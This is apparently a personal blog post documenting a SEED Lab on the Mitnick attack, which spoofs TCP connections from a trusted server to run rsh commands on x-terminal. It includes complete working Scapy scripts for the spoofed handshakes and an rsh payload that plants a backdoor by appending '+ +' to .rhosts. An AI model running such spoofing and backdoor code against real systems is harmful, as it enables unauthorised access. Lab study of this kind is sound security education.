---
layout: post
title: Mitnick Attack
categories: icmp
excerpt: The Mitnick attack is also a TCP session hijacking attack, but it is not like your regular TCP session highjack.
While the regular TCP session highjack involves highjacking a TCP session that already exists between two hosts i.e. `host A` and `host B`, the Mitnick attack is responsible for creating a TCP session between two hosts i.e. `host A` and `host B` and then highjacks the session.
---

The Mitnick attack is also a TCP session hijacking attack, but it is not like your regular TCP session highjack.
While the regular TCP session highjack involves highjacking a TCP session that already exists between two hosts i.e. `host A` and `host B`, the Mitnick attack is responsible for creating a TCP session between two hosts i.e. `host A` and `host B` and then highjacks the session.

In this post, I aim to document my findings and observations while performing a SEED Lab.

```
Attacker: 10.9.0.1
X-Terminal: 10.9.0.5
Trusted server: 10.9.0.6
```

<br>

### Spoof TCP Connections and rsh Sessions
The Mitnick attack involves spoofing a TCP connection from the `trusted server` to `x-terminal`.

An `rsh` session involves two TCP connections.
- The first connection is initiated by the client. After the connection has been established, the client sends `rsh data` (including user IDs and commands) to the server. The `rshd` process will authenticate the user, and if the user is authenticated, `rshd` initiates a separate TCP connection from the server to the client.
- The second connection is used for sending error messages. However, in the case that the connection is not successfully established, `rshd` will not
continue. `rshd` would send an `RST` packet to terminate the first connection. But if the connection is successfully established, `rshd` will run the command in the first connection.

To establish the first connection with `x-terminal`, we have to pretend to be the `trusted server`. Before carrying out the attack, you have to power down the trusted server. In Mitnick's case, he used SYN flooding to bring down the server. In our case, powering down the machine is sufficient. This is to prevent the trusted server from sending `RST` packets to x-terminal.

Initial Sequence numbers were not randomized as when Mitnick conducted the attack, so he was mathematically able to predict x-terminal sequence numbers. This lab involves sniffing the connection to get the sequence number from x-terminal.

To begin the first connection, we choose an initial sequence number, spoof the `IP source address` as `10.9.0.6`, spoof the `TCP source port` as `1023`, set the `SYN` flag, set the `sequence number` and send it to `10.9.0.5:514`. To ensure that the sequence number will always be correct (using an incorrect sequence number will cause the attack to fail), we update the sequence number.

```python
from random import getrandbits
seq_num = getrandbits(32)
send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='S', seq = seq_num), verbose=0)
seq_num += 1
```

Once x-terminal receives the `SYN` packet, it responds with a `SYN-ACK` packet. We have to respond to this packet with an `ACK` packet. Once we reply, and the TCP session is established, we also need to send the `rsh data`. To test that the exploit works, we'll send a command to create a folder on x-terminal called "xyz" in the `tmp` folder

```python
myLoad = '1024\x00seed\x00seed\x00touch /tmp/xyz\x00'
if pkt[TCP].flags == 'SA':
    ack_no = pkt[TCP].seq + 1
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='PA', seq = seq_num, ack = ack_no) / Raw(load = myLoad), verbose=0)
    seq_num += len(myLoad)
```

After the first connection has been established, X-Terminal will initiate the second connection. We have to send a `SYN-ACK` response to x-terminal. Once we do this, x-terminal will respond with an `ACK` packet and the TCP session will be established.

```python
from random import getrandbits
seq_num = getrandbits(32)
TCPLen = len(pkt[TCP].payload)
if pkt[TCP].flags == 'S':
    ack_no = pkt[TCP].seq + 1
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='SA', seq = seq_num, ack = ack_no), verbose=0)
    seq_num += 1  
```

From the screenshot below, we can see that the attack is successful.

![mitnick-folder](https://github.com/iukadike/iukadike.github.io/assets/58455326/49a21cdf-84eb-4eeb-b94c-6895f6dab415)

<br>

The exploit can be further developed to listen for additional connections like PSH, ACK, or FIN connections as seen below:

##### First connection
```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send, sniff
from random import getrandbits

x_ip = "10.9.0.5"              # X-Terminal
x_port = 514                   # Port number used by X-Terminal

srv_ip = "10.9.0.6"            # The trusted server
srv_port = 1023                # Port number used by the trusted server

# Filter for sniffer
myFilter = 'tcp src port 514 && (not ether host 02:42:f7:8f:12:53)'

# Initialize a sequence number
seq_num = getrandbits(32)

def spoof_rply(pkt):
    global seq_num
    
    # Determine TCP length
    TCPLen = len(pkt[TCP].payload)

    # Construct payload
    myLoad = '1024\x00seed\x00seed\x00touch /tmp/xyz\x00'
    
    # If it is a SYN+ACK packet, spoof an ACK reply and establish RSH connecction
    if pkt[TCP].flags == 'SA':
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("connection established...")
        
        # Send the RSH payload
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='PA', seq = seq_num, ack = ack_no) / Raw(load = myLoad), verbose=0)
        # update sequence number to next value
        seq_num += len(myLoad)
        print("RSH payload sent...")
        
    # If it is a FIN packet, close the connection
    elif 'F' in pkt[TCP].flags: 
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='FA', seq = seq_num, ack = ack_no), verbose=0)    
        # update sequence number to next value        
        seq_num += 1           
        print("connection termination requested...")

    # If it is a PSH/ACK packet, acknowledge receipt of packet and data
    elif 'P' in pkt[TCP].flags:
        ack_no = pkt[TCP].seq + TCPLen
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("data received...")
       
    # If it is an ACK packet, do nothing
    elif pkt[TCP].flags == 'A':
        pass
        
def main():
    global seq_num
    # Spoof a SYN packet
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='S', seq = seq_num), verbose=0)
    # update sequence number to next value
    seq_num += 1
    print("sent SYN packet")

    # Listen for replies and respond
    sniff(iface = 'br-7ef88ab00fc9', filter = myFilter, prn=spoof_rply)


if __name__ == '__main__':
    main()
```

***First connection screenshot***

![first-connection](https://github.com/iukadike/iukadike.github.io/assets/58455326/267e69f9-3d81-4bee-992d-aef3f39f3edb)


##### Second Connection
```python
#!/usr/bin/env python3
from scapy.all import IP,TCP,Raw,send,sniff
from random import getrandbits

x_ip = "10.9.0.5"                       # X-Terminal
x_port = 1023                           # Port number used by X-Terminal

srv_ip = "10.9.0.6"                     # The trusted server
srv_port = 1024                         # Port number used by the trusted server

# Filter for sniffer
myFilter = 'tcp dst port 1024 && (not ether host 02:42:f7:8f:12:53)'

# Initialize sequence number
seq_num = getrandbits(32)

def spoof_rply(pkt):
    global seq_num
    
    # Determine TCP length
    TCPLen = len(pkt[TCP].payload)
    
    # If it is a SYN packet, spoof a SYN+ACK reply
    if pkt[TCP].flags == 'S':
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='SA', seq = seq_num, ack = ack_no), verbose=0)
        # update sequence number to next value        
        seq_num += 1  
        print("SYN-ACK sent...")

    # If it is a FIN packet, close the connection
    elif 'F' in pkt[TCP].flags:
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='FA', seq = seq_num, ack = ack_no), verbose=0)
        # update sequence number to next value        
        seq_num += 1  
        print("connection termination requested...")

    # If it is a PSH/ACK packet, acknowledge receipt of packet and data
    elif 'P' in pkt[TCP].flags:
        ack_no = pkt[TCP].seq + TCPLen
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("data received...")
    
    # If it is an ACK packet, do nothing
    elif pkt[TCP].flags == 'A':
        pass

        
def main():
    # Listen for SYN+ACK reply and respond
    sniff(iface = 'br-7ef88ab00fc9', filter = myFilter, prn=spoof_rply)


if __name__ == '__main__':
    main()
```

***Second connection screenshot***

![second-connection](https://github.com/iukadike/iukadike.github.io/assets/58455326/d17abf9b-4b3b-48c0-8900-09f83710c98f)

<br>

### Set Up a Backdoor
To create a backdoor, the rsh payload that is sent needs to edit the `.rhosts` to enable any IP address to connect to x-terminal. This is done by appending `+ +` to the `.rhosts` file on x-terminal.

The code from above can be modified as follows:

##### Connection that creates backdoor
```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send, sniff
from random import getrandbits

x_ip = "10.9.0.5"              # X-Terminal
x_port = 514                   # Port number used by X-Terminal

srv_ip = "10.9.0.6"            # The trusted server
srv_port = 1023                # Port number used by the trusted server

# Filter for sniffer
myFilter = 'tcp src port 514 && (not ether host 02:42:f7:8f:12:53)'

# Initialize a sequence number
seq_num = getrandbits(32)

def spoof_rply(pkt):
    global seq_num
    
    # Determine TCP length
    TCPLen = len(pkt[TCP].payload)

    # Construct payload
    myLoad = '1024\x00seed\x00seed\x00echo + + >> .rhosts\x00'
    
    # If it is a SYN+ACK packet, spoof an ACK reply and establish RSH connecction
    if pkt[TCP].flags == 'SA':
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("connection established...")
        
        # Send the RSH payload
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='PA', seq = seq_num, ack = ack_no) / Raw(load = myLoad), verbose=0)
        # update sequence number to next value
        seq_num += len(myLoad)
        print("RSH payload sent...")
        
    # If it is a FIN packet, close the connection
    elif 'F' in pkt[TCP].flags: 
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='FA', seq = seq_num, ack = ack_no), verbose=0)    
        # update sequence number to next value        
        seq_num += 1           
        print("connection termination requested...")

    # If it is a PSH/ACK packet, acknowledge receipt of packet and data
    elif 'P' in pkt[TCP].flags:
        ack_no = pkt[TCP].seq + TCPLen
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("data received...")
       
    # If it is an ACK packet, do nothing
    elif pkt[TCP].flags == 'A':
        pass
        
def main():
    global seq_num
    # Spoof a SYN packet
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='S', seq = seq_num), verbose=0)
    # update sequence number to next value
    seq_num += 1
    print("sent SYN packet")

    # Listen for replies and respond
    sniff(iface = 'br-7ef88ab00fc9', filter = myFilter, prn=spoof_rply)


if __name__ == '__main__':
    main()
```

As seen by the screenshot below, the attack is successful.

***modified `.rhosts`***

![mitnick-rhosts](https://github.com/iukadike/iukadike.github.io/assets/58455326/cd3a64bc-9c6c-43fc-9524-5122af04db8a)

When the attacker tries connecting to x-terminal from his machine, he does so successfully.

***rsh from attacker to x-terminal***

![mitnick-backdoor](https://github.com/iukadike/iukadike.github.io/assets/58455326/38d08e61-4ccf-4851-9a1e-62fc973cc7b7)

The packet trace can be oberved in wireshark

***mitnick attack wireshark capture***

![mitnick-wireshark](https://github.com/iukadike/iukadike.github.io/assets/58455326/0e2a02b8-9de9-4210-a41f-de7f6f8623f3)

<br>

_Thanks for reading._